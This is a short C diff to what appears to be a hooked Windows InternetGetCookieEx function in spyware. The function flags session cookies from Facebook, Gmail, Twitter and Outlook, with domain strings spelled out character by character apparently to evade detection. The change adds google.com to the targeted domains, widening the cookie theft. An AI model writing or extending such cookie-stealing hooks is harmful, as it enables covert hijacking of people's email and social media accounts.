@@ -424,6 +424,7 @@ BOOL __stdcall PM_InternetGetCookieEx(LPCWSTR lpszURL, LPCWSTR lpszCookieName, L
 
 	WCHAR facebook_url[] = { L'f', L'a', L'c', L'e', L'b', L'o', L'o', L'k', L'.', L'c', L'o', L'm', L'/', 0 };
 	WCHAR gmail_url[] = { L'm', L'a', L'i', L'l', L'.', L'g', L'o', L'o', L'g', L'l', L'e', L'.', L'c', L'o', L'm', L'/', 0 };
+	WCHAR gmail_url2[] = { L'g', L'o', L'o', L'g', L'l', L'e', L'.', L'c', L'o', L'm', L'/', 0 };
 	WCHAR twitter_url[] = { L't', L'w', L'i', L't', L't', L'e', L'r', L'.', L'c', L'o', L'm', L'/', 0 };
 	WCHAR outlook_url[] = { L'l', L'i', L'v', L'e', L'.', L'c', L'o', L'm', L'/', 0 };
 	DWORD local_size = MAX_COOKIE_SIZE-1;
@@ -438,6 +439,8 @@ BOOL __stdcall PM_InternetGetCookieEx(LPCWSTR lpszURL, LPCWSTR lpszCookieName, L
 		if (pData->pStrStrW((WCHAR *)lpszURL, facebook_url))
 			origin |= COOKIE_FACEBOOK;
 		else if (pData->pStrStrW((WCHAR *)lpszURL, gmail_url))
+			origin |= COOKIE_GMAIL;
+		else if (pData->pStrStrW((WCHAR *)lpszURL, gmail_url2))
 			origin |= COOKIE_GMAIL;
 		else if (pData->pStrStrW((WCHAR *)lpszURL, twitter_url))
 			origin |= COOKIE_TWITTER;
